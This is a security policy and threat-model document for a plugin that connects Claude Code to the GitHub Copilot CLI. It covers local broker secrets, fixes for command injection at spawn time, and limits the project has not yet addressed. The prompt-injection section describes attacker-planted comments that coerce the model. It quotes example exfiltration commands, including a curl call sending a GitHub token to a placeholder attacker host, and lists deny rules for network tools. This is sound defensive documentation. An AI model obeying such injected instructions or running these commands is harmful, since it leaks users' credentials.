# Security

## Reporting a vulnerability

If you believe you have found a security issue in this plugin, please
**file a private report** via GitHub Security Advisories:

- https://github.com/andyzengmath/copilot-plugin-cc/security/advisories/new

Avoid opening a public issue until a fix is available. For issues in the
underlying GitHub Copilot CLI itself, report them to GitHub Copilot
instead: https://github.com/github/copilot/security .

## Supported versions

This project is pre-1.0 and only the latest tagged release receives
security fixes. Older tags are not backported.

## Threat model

### What the plugin is designed to defend against

- **Cross-host attackers.** The plugin never exposes a network listener;
  the ACP broker listens only on a local Unix socket (macOS/Linux) or a
  named pipe (Windows). There is no TCP binding and no remote endpoint.
- **Co-located processes running as a different user.** On macOS and
  Linux the session directory is created via
  [`fs.mkdtempSync`](https://nodejs.org/api/fs.html#fsmkdtempsyncprefix-options)
  (mode `0700` on the directory) and the `broker.json` file is written
  with `mode: 0o600` and re-`chmod`'d explicitly so a narrower umask
  cannot widen permissions. The broker additionally requires every
  connecting client to present a 256-bit random secret in the
  `initialize` handshake (`initParams._meta.brokerSecret`) before it
  will accept any other RPC. The secret is rotated every time a new
  broker is spawned.
- **Command injection via per-call `--model` or `--effort`.** When
  `/copilot:task`, `/copilot:review`, or `/copilot:adversarial-review`
  is invoked with `--model` or `--effort`, the plugin bypasses the
  broker and spawns `copilot -p "<prompt>" --model <model>` as a
  one-shot subprocess. On Windows the real Copilot CLI ships as a
  `.cmd` launcher, which historically required Node's `spawn()` to use
  `shell: true` for PATH / PATHEXT resolution — opening a
  CVE-2024-27980 ("BatBadBut") class injection surface.

  Since v0.0.18 every spawn site (broker `--acp`, one-shot
  `runCopilotCli`, model-availability `probeSingleModel`) routes
  through
  [`plugins/copilot/scripts/lib/safe-spawn.mjs`](./plugins/copilot/scripts/lib/safe-spawn.mjs)
  with `shell: false`. The helper pre-resolves Windows `.cmd`/`.bat`
  launchers via PATHEXT, applies cross-spawn-style argv escaping
  (backslash-double-quoting + caret-escape of cmd metacharacters), and
  spawns with `windowsVerbatimArguments: true`. With `shell: false`
  argv reaches the child verbatim — `prompt`, `--model` value, and
  `cwd` cannot become metacharacters in a cmd.exe context, so the
  CVE-2024-27980 class is closed at the spawn boundary rather than at
  an input filter. The v0.0.3-era hand-rolled `SHELL_METACHAR_RE` +
  `assertNoShellMetachars` deny-list was deleted in v0.0.18 (it was
  incomplete — missed `(`, `)`, `*` — and is no longer needed under
  `shell: false`). `engines.node` requires Node 18.20.2+, 20.12.2+, or
  22.0.0+ (caret-bounded since v0.0.19) so the upstream Node
  CVE-2024-27980 mitigation is guaranteed present alongside the
  plugin's own escape pipeline.

- **Concurrent-session broker hijack.** Two Claude sessions starting on
  the same workspace simultaneously could previously race to each spawn
  their own detached `copilot --acp` broker, and the loser's orphaned
  broker would stay alive under the same user account with no reference
  from `broker.json`. Since v0.0.8 a workspace-scoped `broker.lock`
  (atomic `O_CREAT|O_EXCL` create, `0600`, holds the lock-owner's
  `<pid>\n<timestamp>\n` only — no secrets) serializes the read-decide-
  spawn critical section. Stale-lock recovery uses
  `process.kill(holderPid, 0)`: `ESRCH` steals the lock; `EPERM` is
  treated as alive (the lock owner is another user's live process and
  we leave them alone). See
  [`plugins/copilot/scripts/lib/broker-lifecycle.mjs`](./plugins/copilot/scripts/lib/broker-lifecycle.mjs).
- **Silent acceptance of malformed structured review output.** Since
  v0.0.8 (tightened in v0.0.9) `/copilot:review` and
  `/copilot:adversarial-review` validate Copilot's JSON response against
  the full schema at
  [`plugins/copilot/schemas/review-output.schema.json`](./plugins/copilot/schemas/review-output.schema.json)
  before rendering. Violations render as a bulleted `Schema violations:`
  section naming every breach, rather than being silently normalized
  with default placeholders (old pre-v0.0.8 behavior let a malformed
  finding render cleanly with `severity: "low"`, `file: "unknown"`,
  etc., masking the real output bug). This reduces prompt-injection
  surface where the model was coerced into emitting structured-looking
  but meaningless output.

### What the plugin does *not* defend against

- **Users with local admin / root on the same machine.** A local
  administrator can read process memory, your home directory, and the
  Copilot CLI's own config. Plugin state is not hardened against that
  threat.
- **Windows ACL defaults.** On Windows `fs.chmod` is largely a no-op.
  `broker.json`, the plugin job store under `CLAUDE_PLUGIN_DATA`, and
  the temp session directory inherit the ACLs of their parent (usually
  `%LOCALAPPDATA%\Temp` or the directory you set via
  `CLAUDE_PLUGIN_DATA`). Those ACLs typically grant `Administrators`
  and `SYSTEM` read access. Treat anything stored there as readable by
  local admin. If your workstation is shared with other admin accounts,
  do not rely on `broker.json` confidentiality.
- **Prompt-injection exfiltration from the LLM.** Copilot-the-model can
  be coerced by a malicious prompt (for example, an attacker-planted
  comment in a reviewed file) into calling
  `--allow-all-tools`-permitted operations like `run_command`. The
  plugin does *not* stop the model from doing this. The broker path
  auto-approves each tool request via `firstAllowOption` in
  [`plugins/copilot/scripts/lib/acp-client.mjs`](./plugins/copilot/scripts/lib/acp-client.mjs):
  it prefers `allow_once`, and if no `allow_once` option is offered it
  falls back to the first option that is not `allow_always`,
  `reject_once`, or `reject_always` (typically a `kind`-less default).
  It never selects `allow_always`, so per-call permission widening is
  the explicit boundary. The per-call CLI path has no such per-tool
  approval round-trip and runs with `--allow-all-tools --allow-all-paths`
  for the whole subprocess lifetime.

  **v0.0.17 hardenings on the same path:**
  - `--no-ask-user` is now appended to both the broker spawn args and
    the one-shot CLI args, so the agent's `ask_user` tool is
    unavailable at the CLI level. Without this, a prompt-injected
    `ask_user` call could either stall the run or get
    blanket-auto-approved by `firstAllowOption` (returning empty
    input). With it, the tool isn't surfaced at all.
  - `--secret-env-vars=COPILOT_GITHUB_TOKEN,GH_TOKEN,GITHUB_TOKEN` is
    pinned on both spawn paths, so a prompt-injected
    `cat $env:GH_TOKEN` (or any other shell command that echoes those
    auth-token vars) renders as `[REDACTED]` in stdout/stderr instead
    of the literal token. This narrows the exfiltration surface for
    the auth-token vars specifically; other secrets in env are
    unaffected.

  **v0.0.18 hardenings:**
  - `--deny-tool=shell(curl:*)` plus the same pattern for `wget`,
    `nc`, `ncat`, and `ssh` are pinned on both spawn paths. Per
    `copilot help permissions`: *"Denial rules always take precedence
    over allow rules, even --allow-all-tools."* So a prompt-injected
    `curl https://attacker/?d=$env:GH_TOKEN` is denied at the CLI
    level even with the broker's `--allow-all-tools`. These commands
    have no legitimate use in code-review or rescue workflows
    (GitHub API → `gh`; npm registry → `npm`).
  - The hand-rolled `assertNoShellMetachars` deny-list (and its
    accompanying `SHELL_METACHAR_RE`) was removed in favor of
    `lib/safe-spawn.mjs` — a cross-spawn-style spawn helper that
    pre-resolves Windows `.cmd`/`.bat` launchers and quotes argv
    correctly with `windowsVerbatimArguments: true`. The old
    deny-list only covered a partial set of cmd metacharacters
    (missing `(`, `)`, `*`) and was incomplete protection for the
    `--deny-tool` use case. safeSpawn replaces it entirely: argv now
    reaches Copilot verbatim with no shell interpretation, so the
    runtime cannot rewrite or inject metacharacters at all. This
    eliminates the entire CVE-2024-27980 / "BatBadBut" attack
    surface in the plugin's own code.
- **Supply-chain attacks on Copilot CLI or Node dependencies.** The
  plugin trusts whatever binary is on `PATH` as `copilot`, the Node
  runtime you launched with, and the npm packages this repo depends on.
  Audit those separately (e.g. `npm audit`, package signing).
- **The user themselves.** The threat model assumes you are running
  your own user account on your own machine. The plugin does not try to
  prevent a logged-in user from inspecting or modifying their own
  plugin state.

## Secrets and paths to know

| Artifact                         | Location                                                         | Notes                                                                                                     |
| -------------------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| Broker shared secret             | `<CLAUDE_PLUGIN_DATA>/state/<workspace>/broker.json` (`secret`)  | 256-bit random hex; rotated per broker. Mode `0600` on POSIX; Windows ACLs only.                          |
| Broker spawn lock                | `<CLAUDE_PLUGIN_DATA>/state/<workspace>/broker.lock`             | Per-workspace mutex for concurrent-session broker reuse (since v0.0.8). Mode `0600`. Holds `<pid>\n<timestamp>\n` only — no secrets. Unlinked when the owner exits the critical section. |
| Broker socket / named pipe       | `<os.tmpdir()>/cpc-XXXXXX/broker.sock` (Unix) or `\\.\pipe\cpc-…` (Windows) | Unix socket inherits the mkdtemp directory's `0700`. Named pipes are user-scoped.                          |
| Broker PID / log                 | Alongside the socket in the session dir                          | Cleaned up via `teardownBrokerSession`.                                                                   |
| Per-workspace job records        | `<CLAUDE_PLUGIN_DATA>/state/<workspace>/jobs/*.json`             | Contains prompt text, threadId, final message excerpts. Treat as you would a local work log.              |
| `CLAUDE_PLUGIN_DATA`             | Claude Code sets this; otherwise defaults to a per-OS cache dir  | Use this env var to relocate state to a tighter-permission directory if you need it.                      |

## Security-relevant env vars

- `COPILOT_COMPANION_ACP_ENDPOINT` — if set, the plugin reuses an
  existing broker at that endpoint instead of spawning one. Treat like
  a trusted local-only path.
- `COPILOT_COMPANION_ACP_SECRET` — set inside the broker's own child
  env to hand the secret to the broker process. Users do not normally
  set this.
- `COPILOT_COMPANION_COPILOT_COMMAND` — test-only override for the
  Copilot binary (expects a JSON array, e.g. `["node", "tests/fake-copilot.mjs"]`).
  Never set this in production; it bypasses the normal PATH-based
  `copilot` resolution.

## Known limits we plan to revisit

- No native Windows ACL enforcement for `broker.json` / `broker.lock`.
  A future change can call `icacls` or the Win32 security API to match
  the POSIX `0600` intent.
- The per-call CLI path spawns with `--allow-all-tools --allow-all-paths`
  unconditionally. Scoping those to `options.write` would require
  Copilot CLI to support non-interactive tool approval in `-p` mode.
- **Per-ACP-session sandboxing** (the v1.1 design-doc item 3):
  `copilot --acp` does not expose a per-session permission surface, so
  all ACP sessions inside a broker share the broker-level
  `--allow-all-tools --allow-all-paths --allow-all-urls` set. Tracked
  upstream; blocked on Copilot CLI exposing per-session flags via the
  ACP `session/new` surface.
- **Review-path `--effort` argv on Windows.** The v0.0.18 cross-spawn
  helper (see "Command injection" above) handles `.cmd` argv-quoting
  for review prompts containing XML tags, so XML survives the cmd.exe
  escape pipeline and reaches Copilot verbatim under `shell: false`.
  The pre-v0.0.18 deny-list rejection of XML tags is gone. End-to-end
  Windows-production verification of `/copilot:review --effort` with
  XML-bearing prompts is not yet captured by an explicit CI test;
  tracked in [docs/plans/2026-04-20-v08-handoff.md](./docs/plans/2026-04-20-v08-handoff.md).
